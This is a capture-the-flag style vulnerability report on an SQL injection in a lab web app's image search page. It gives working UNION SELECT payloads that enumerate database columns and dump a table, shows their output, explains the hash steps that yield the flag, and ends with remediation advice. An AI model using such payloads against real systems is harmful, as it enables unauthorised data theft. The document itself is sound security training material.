# SQL advanced injection (via image research page) vulnerability report

### Location: 
***http://192.168.56.3/index.php?page=searchimg***

## Description:

When we discovered SQL injection breach on member page, and we got all `users` tables, there was some information about `list_images`.
The SQL injection:

`1 UNION SELECT table_name, column_name FROM information_schema.columns`

Results:

```
...
ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns  
Title: id
Url : list_images

ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns  
Title: url
Url : list_images

ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns  
Title: title
Url : list_images

ID: 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns  
Title: comment
Url : list_images
...
```
Now we can use the same method to retrieve the data from these tables:

`1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images`

```
ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 1https://fr.wikipedia.org/wiki/Programme_NsaAn image about the NSA !
Url : 1

ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 2https://fr.wikipedia.org/wiki/Fichier:4242 !There is a number..
Url : 1

ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 3https://fr.wikipedia.org/wiki/Logo_de_GoGoogleGoogle it !
Url : 1

ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 4https://en.wikipedia.org/wiki/Earth#/medEarthEarth!
Url : 1

ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 1
```
if we decode `1928e8083cf461a51303633093573c46` we get `albatroz`, then we encode this word in sha256 we get the Flag!

## Recommendations:

1. Input _validation_ and _sanitization_ on all user inputs.

2. Use _prepared_ statements or _parameterized_ queries.

3. Grant users only the permissions they _absolutely_ need, avoid using _overly permissive_ database accounts.